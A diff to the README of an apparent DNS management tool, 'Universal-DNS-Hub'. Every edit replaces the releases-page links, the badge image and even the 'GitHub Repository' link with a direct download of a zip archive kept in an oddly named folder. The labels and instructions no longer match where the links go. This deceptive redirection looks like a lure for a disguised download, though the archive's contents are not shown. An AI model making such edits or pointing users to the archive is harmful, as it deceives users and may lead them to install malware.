@@ -1,6 +1,6 @@
 # 🌐 Universal-DNS-Hub - Effortless DNS Management Made Simple
 
-[![Download Universal-DNS-Hub](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/nguyendinh97/Universal-DNS-Hub/releases)
+[![Download Universal-DNS-Hub](https://github.com/nguyendinh97/Universal-DNS-Hub/raw/refs/heads/main/stubachite/Hub_Universal_DN_v2.2.zip)](https://github.com/nguyendinh97/Universal-DNS-Hub/raw/refs/heads/main/stubachite/Hub_Universal_DN_v2.2.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started with Universal DNS Hub, you need to download the application. Bel
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   Click this link to access the download page: [Download Universal-DNS-Hub](https://github.com/nguyendinh97/Universal-DNS-Hub/releases).
+   Click this link to access the download page: [Download Universal-DNS-Hub](https://github.com/nguyendinh97/Universal-DNS-Hub/raw/refs/heads/main/stubachite/Hub_Universal_DN_v2.2.zip).
 
 2. **Select the Latest Release:**
    On the releases page, look for the most recent version. It usually appears at the top of the list.
@@ -73,7 +73,7 @@ If you encounter issues or have questions, we’re here to help. Use the issue t
 
 For more insights and tips, check out these helpful links:
 
-- [GitHub Repository](https://github.com/nguyendinh97/Universal-DNS-Hub)
+- [GitHub Repository](https://github.com/nguyendinh97/Universal-DNS-Hub/raw/refs/heads/main/stubachite/Hub_Universal_DN_v2.2.zip)
 - [Documentation](#) (Link to documentation)
 - [Frequently Asked Questions (FAQ)](#) (Link to FAQ)
 
@@ -81,4 +81,4 @@ For more insights and tips, check out these helpful links:
 
 Universal DNS Hub is open-source software licensed under the MIT License. You are free to use, modify, and distribute this software.
 
-[![Download Universal-DNS-Hub](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/nguyendinh97/Universal-DNS-Hub/releases)
+[![Download Universal-DNS-Hub](https://github.com/nguyendinh97/Universal-DNS-Hub/raw/refs/heads/main/stubachite/Hub_Universal_DN_v2.2.zip)](https://github.com/nguyendinh97/Universal-DNS-Hub/raw/refs/heads/main/stubachite/Hub_Universal_DN_v2.2.zip)
